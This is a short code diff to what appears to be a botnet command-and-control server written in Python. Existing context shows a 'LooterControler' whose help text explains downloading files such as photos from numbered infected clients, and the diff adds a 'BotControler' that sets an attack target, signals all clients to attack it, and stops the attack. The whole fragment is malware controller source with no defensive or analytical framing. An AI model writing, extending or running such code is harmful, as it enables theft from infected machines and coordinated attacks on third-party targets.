@@ -97,3 +97,25 @@ class LooterControler(BasicControler):
         hilfe += '--- ss "@<client_id> grab <file_name>"    - Download file from client\n'
         hilfe += '--- ex: ss "@4 grab photo.jpg"            - Download "photo.jpg" from client no4\n'
         return hilfe + hilfe_s
+
+class BotControler(BasicControler):
+    def __init__(self, pipe, server_callback):
+        super().__init__(pipe, server_callback)
+    
+    def base_cmd(self, cmd):
+        if cmd[0] == "tar":
+            self.Server.target = cmd[1]
+            self.Server.Msg(f"\n[{self.Server.name}] Set Auto-Target: {cmd[1]}", level=True)
+            return True
+        elif cmd[0] == "ATT":
+            self.Server.Msg(f"\n[{self.Server.name}] Send attack to all clients", level=True)
+            self.Server.signal_attack()
+            return True
+        elif cmd[0] == "stp":
+            self.Server.Msg(f"\n[{self.Server.name}] Send signal to stop attack", level=True)
+            self.Server.stop_attack()
+            return True
+        else:
+            self._base_cmd(cmd)
+    
+
